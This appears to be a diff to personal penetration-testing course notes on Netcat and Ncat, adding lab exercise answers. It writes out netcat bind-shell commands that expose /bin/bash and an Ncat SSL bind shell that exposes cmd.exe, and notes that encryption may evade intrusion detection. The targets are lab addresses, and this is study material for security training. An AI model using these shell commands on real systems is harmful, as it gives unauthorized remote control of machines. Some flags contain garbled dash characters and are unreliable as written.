@@ -5,6 +5,7 @@
 ## Table fo contents
 
 #### [2.1 - Netcat](#21---netcat-1)
+#### [2.2 - Ncat]
 
 ## 2.1 - Netcat
 
@@ -116,9 +117,6 @@ Notice that we haven't received any feddback from **netcat** about our file uplo
 
 One of the most useful features of netcat is its ability to do command redirection. Netcat can take an executable file and redirect the input, output, and error messages to a TCP/UDP port rather than the default console. To further explain this, consider the cmd.exe executable. By redirecting the stdin, stdout, and stderrto the network, you can bind cmd.exe to a local port. Anyone connecting to this port will be resented with a command prompt belonging to this computer.
 
-```
-```
-
 #### 2.1.4.1 - Netcat Bind Shell Scenario
 I our first scenario, Bob (running Windows) has requested Alice's assistence (running Linux) and has asked her to connect to his computer and issue some commands remotely. bob has a public IP address, and is directly connected to the Internet. Alice, however, is behind a NATd connection, and has an internal IP address. To complete the scenario, Bob needs to bind **cmd.exe** to a TCP port in his public IP address, and ask Alice to connect to this particular IP and port. Bob will procees to issue the following command with **netcat**
 
@@ -190,7 +188,69 @@ nc -vn 10.0.2.2 4444
 ```
 
 2. Practice using Netcat to create the following:
-	* Reverse shell from Kali to Windows
-	* Reverse shell from Windows to Kali
-	* Bind shell on Kali. use your Windows client to connect to it
-	* Bind shell in Windows. Use your kali system to connec to it
+* Reverse shell from Kali to Windows
+
+* Reverse shell from Windows to Kali
+
+* Bind shell on Kali. use your Windows client to connect to it
+
+> Kali Linux
+```
+root@kali:~# nc -vnlp 4444 -e /bin/bash 
+```
+
+> Ubuntu (Windows)
+```
+$ nc -vn 10.0.2.15 4444
+```
+
+* Bind shell in Windows. Use your kali system to connec to it
+
+> Ubuntu (Windows)
+```
+$ nc -vnlp 4444 -e /bin/bash
+```
+
+> Kali Linux
+```
+root@kali:~# nc -vn 10.0.2.2 4444
+```
+
+3. Transfer a file from your Windows to Kali system clinet to connect to it
+
+> Kali Linux
+```
+root@kali:~# nc -vn 10.0.2.2 4444 < kali-linux-machine 
+```
+
+> Ubuntu (Windows)
+```
+zero@zero-ubt:~$ nc -vnlp 4444 > file.txt
+```
+
+## 2.2 - Ncat
+
+Ncat is described as "a feature-packed networking utility that reads and writes data across networks from the command line".
+On eog the major drawbacks of **Netcat**, from a penetration tester's standpoint, is that it lacks the ability to authenticate and excrypt incoming and outgoing connections.
+For example, **ncat** could be used in the following way to replicate a more secure bind shell between Bob and Alice. Bob would use **ncat** to set up an SSL encrypted connection on port 4444 and allow only Alice's IP (10.0.0.4) to connect to it:
+
+```
+C:\Users\offsec> ncat -­­‐exec cmd.exe ‐-­allow 10.0.0.4 ­‐vnl 4444 -­‐ssl
+Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
+Ncat: Generating a temporary 1024­‐bit RSA key. 
+Ncat: SHA­‐1 fingerprint: 1FC9 A338 0B1F 4AE5 897A 375F 404E 8CB1 12FA DB94
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.0.0.4:43500.
+```
+
+Alice, in turn, would connect to Bob's public IP with SSL encryption enabled, preventing eavesdropping, and possibly even IDS detection
+
+```
+root@kali:~# ncat -­‐v 10.0.0.22 4444 -­‐ssl
+Ncat: Version 6.25 ( http://nmap.org/ncat )
+Ncat: SSL connection to 10.0.0.22:4444.
+Ncat: SHA­‐1 fingerprint: 1FC9 A338 0B1F 4AE5 897A 375F 404E 8CB1 12FA DB94
+Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\offsec>
+```
